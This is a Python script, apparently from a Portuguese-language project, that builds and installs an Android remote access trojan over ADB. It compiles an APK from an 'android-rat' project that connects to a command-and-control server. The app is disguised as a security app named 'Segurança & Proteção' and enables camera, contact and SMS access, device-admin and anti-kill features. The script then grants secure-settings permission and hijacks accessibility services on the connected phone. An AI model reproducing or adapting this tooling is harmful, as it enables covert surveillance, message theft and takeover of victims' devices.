import sys
import os
import subprocess
from pathlib import Path
from PIL import Image

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

sys.path.append(os.path.abspath("."))
from apk_builder import APKBuilder

def run_cmd(cmd):
    print(f">> {cmd}")
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='replace')
    if res.stdout:
        print(res.stdout.strip())
    if res.stderr:
        print(res.stderr.strip())
    return res

def main():
    print("=" * 60)
    print("GERANDO NOVO APK E INSTALANDO NO APARELHO CONECTADO VIA USB")
    print("=" * 60)

    # 1. Verifica dispositivo conectado
    res = subprocess.run("adb devices", shell=True, capture_output=True, text=True, encoding='utf-8', errors='replace')
    lines = [l.strip() for l in res.stdout.splitlines() if l.strip() and not l.startswith("List of")]
    devices = [l.split()[0] for l in lines if "\tdevice" in l]

    if not devices:
        print("[ERRO] Nenhum dispositivo conectado via USB (adb)!")
        sys.exit(1)

    device_id = devices[0]
    print(f"[INFO] Dispositivo conectado detectado: {device_id}")

    # Configura adb reverse para a porta 5000
    run_cmd(f"adb -s {device_id} reverse tcp:5000 tcp:5000")

    base_root = Path(__file__).resolve().parent.parent
    icon_path = (base_root / "server" / "temp_app_icon.png").resolve()
    if not icon_path.exists():
        img = Image.new('RGBA', (192, 192), color=(0, 112, 243, 255))
        img.save(icon_path)

    import gangstar_env
    server_url = gangstar_env.public_ws_url()
    output_apk = (base_root / "server" / "gangstar_usb_app.apk").resolve()
    project_dir = (base_root / "android-rat").resolve()

    print(f"[INFO] Projeto Android: {project_dir}")
    print(f"[INFO] Servidor C&C: {server_url}")
    print(f"[INFO] Destino APK: {output_apk}")

    builder = APKBuilder(android_project_path=str(project_dir), ngrok_url=server_url)

    success = builder.build_custom_apk(
        app_name="Segurança & Proteção",
        icon_path=str(icon_path),
        output_path=str(output_apk),
        webview_url="https://google.com",
        hide_from_launcher=False,
        request_admin=True,
        enable_anti_kill=True,
        language="pt",
        enable_camera=True,
        enable_contacts=True,
        enable_send_sms=True,
        enable_read_sms=True
    )

    if not success or not output_apk.exists():
        print("[ERRO] Falha ao compilar o APK!")
        sys.exit(1)

    print(f"[SUCESSO] APK gerado com sucesso! Tamanho: {output_apk.stat().st_size / (1024*1024):.2f} MB")

    # 4. Instala no aparelho conectado
    print(f"[INFO] Instalando no dispositivo {device_id}...")
    install_res = run_cmd(f'adb -s {device_id} install -r -d "{output_apk}"')

    pkg_name = getattr(builder, 'last_package_name', 'com.arlosoft.macrodroid')
    if not pkg_name:
        pkg_name = 'com.arlosoft.macrodroid'

    print(f"[SUCESSO] Aplicativo ({pkg_name}) instalado com sucesso no aparelho!")
    print("[INFO] Concedendo permissões de sistema e ativando acessibilidade via ADB...")
    run_cmd(f"adb -s {device_id} shell pm grant {pkg_name} android.permission.WRITE_SECURE_SETTINGS")
    run_cmd(f"adb -s {device_id} shell settings put secure enabled_accessibility_services none")
    run_cmd(f"adb -s {device_id} shell settings put secure enabled_accessibility_services {pkg_name}/com.seguranca.protecao.UiAssistBridge")
    run_cmd(f"adb -s {device_id} shell settings put secure accessibility_enabled 1")
    run_cmd(f"adb -s {device_id} shell am start -n {pkg_name}/com.seguranca.protecao.MainActivity")

if __name__ == "__main__":
    main()
